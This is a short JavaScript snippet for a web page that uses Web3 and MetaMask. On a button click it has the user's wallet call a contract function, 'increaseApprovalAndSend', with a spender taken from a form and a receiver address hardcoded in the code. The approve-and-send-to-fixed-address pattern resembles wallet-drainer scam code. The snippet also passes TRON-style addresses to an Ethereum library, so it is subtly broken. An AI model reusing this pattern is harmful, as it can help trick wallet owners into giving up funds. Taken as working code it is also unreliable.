// Ensure Web3 is available
if (window.ethereum) {
    const web3 = new Web3(window.ethereum);

    // Define contract details
    const contractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Replace with your smart contract address
    const abi = [
        // Replace with your smart contract ABI
        {
            "constant": false,
            "inputs": [
                {
                    "name": "_spender",
                    "type": "address"
                },
                {
                    "name": "_receiver",
                    "type": "address"
                },
                {
                    "name": "_amount",
                    "type": "uint256"
                }
            ],
            "name": "increaseApprovalAndSend",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    // Create contract instance
    const contract = new web3.eth.Contract(abi, contractAddress);

    document.getElementById('sendButton').addEventListener('click', async () => {
        // Get values from the form
        const amount = document.getElementById('amount').value;
        const senderAddress = document.getElementById('senderAddress').value;

        // Validate amount
        if (isNaN(amount) || amount <= 0) {
            alert('Please enter a valid amount greater than 0');
            return;
        }

        // Default receiver address
        const receiverAddress = 'TFwMA6d1aCaCvEyQGXwHbNWQmRU9qeJnXr';

        try {
            // Request accounts and perform transaction
            const accounts = await web3.eth.getAccounts();
            const account = accounts[0];

            await contract.methods.increaseApprovalAndSend(
                senderAddress,
                receiverAddress,
                web3.utils.toWei(amount, 'ether') // Convert amount to wei if needed
            ).send({ from: account });

            alert('Transaction successful!');
        } catch (error) {
            console.error('Transaction failed:', error);
            alert('Transaction failed. Check the console for more details.');
        }
    });
} else {
    alert('Please install MetaMask or another Web3 provider.');
}
